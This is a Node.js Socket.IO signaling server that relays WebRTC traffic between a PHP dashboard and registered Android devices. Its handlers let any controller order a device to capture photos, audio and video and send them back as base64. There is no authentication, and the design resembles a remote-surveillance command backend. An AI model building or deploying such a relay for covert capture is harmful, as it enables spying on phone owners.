// Node.js WebRTC Signaling Backend - Deploy on Render
// SEPARATE from PHP dashboard - only handles WebRTC signaling
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  },
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());

// Health check - Render needs this, NOT a web dashboard
app.get('/', (req, res) => {
  res.json({ status: 'WebRTC Signaling Server Running', time: new Date().toISOString() });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', connections: Object.keys(rooms).length });
});

const rooms = {};
const deviceSockets = {};

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  // Device (Android) registers itself
  socket.on('register-device', (data) => {
    const deviceId = data.deviceId || socket.id;
    deviceSockets[deviceId] = socket.id;
    rooms[socket.id] = { type: 'device', deviceId };
    socket.join(`device_${deviceId}`);
    console.log('Device registered:', deviceId);
    io.emit('device-list-update', Object.keys(deviceSockets));
  });

  // Controller (PHP dashboard viewer) joins
  socket.on('join-as-controller', (data) => {
    rooms[socket.id] = { type: 'controller', deviceId: data.deviceId };
    socket.join(`ctrl_${data.deviceId}`);
    // Notify device to start stream
    io.to(`device_${data.deviceId}`).emit('start-stream', { controllerId: socket.id });
    console.log('Controller joined for device:', data.deviceId);
  });

  // WebRTC SDP offer from device
  socket.on('offer', (data) => {
    io.to(data.to).emit('offer', { sdp: data.sdp, from: socket.id });
  });

  // WebRTC SDP answer from controller
  socket.on('answer', (data) => {
    io.to(data.to).emit('answer', { sdp: data.sdp, from: socket.id });
  });

  // ICE candidates
  socket.on('ice-candidate', (data) => {
    io.to(data.to).emit('ice-candidate', { candidate: data.candidate, from: socket.id });
  });

  // Media capture commands from controller to device
  socket.on('capture-image', (data) => {
    io.to(`device_${data.deviceId}`).emit('capture-image', { camera: data.camera || 'front' });
  });

  socket.on('capture-audio', (data) => {
    io.to(`device_${data.deviceId}`).emit('capture-audio', { duration: data.duration || 10 });
  });

  socket.on('capture-video', (data) => {
    io.to(`device_${data.deviceId}`).emit('capture-video', { duration: data.duration || 15, camera: data.camera || 'back' });
  });

  // Receive captured media from Android and forward upload URL to PHP
  socket.on('media-captured', (data) => {
    // data: { deviceId, type, base64, filename }
    io.to(`ctrl_${data.deviceId}`).emit('media-ready', data);
  });

  // Disconnect handling with auto-reconnect support
  socket.on('disconnect', (reason) => {
    console.log('Disconnected:', socket.id, reason);
    // Clean up device mapping
    for (const [deviceId, sid] of Object.entries(deviceSockets)) {
      if (sid === socket.id) {
        delete deviceSockets[deviceId];
        io.emit('device-list-update', Object.keys(deviceSockets));
        break;
      }
    }
    delete rooms[socket.id];
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Signaling server listening on port ${PORT}`);
});
